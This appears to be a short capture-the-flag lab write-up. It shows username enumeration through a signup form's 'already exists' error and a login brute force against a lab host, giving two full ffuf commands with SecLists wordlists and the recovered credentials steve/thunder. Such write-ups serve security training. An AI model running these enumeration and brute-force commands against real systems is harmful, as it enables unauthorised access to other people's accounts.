When I enter the username as admin on http://10.10.229.53/customers/signup, there is an error that username already exist.
I inspect the request and use a wordlist to bruteforce valid usernames this way:
└─# ffuf -w /opt/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.53/customers/signup -mr "username already exists"
And this returns 4 users:
admin                   
robert                  
simon                   
steve

Now, it is time to bruteforce passwords on http://10.10.229.53/customers/login following similar approach as above.
ffuf -w usernames.txt:W1,/opt/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.53/customers/login -fc 200
And this yields : steve/thunder
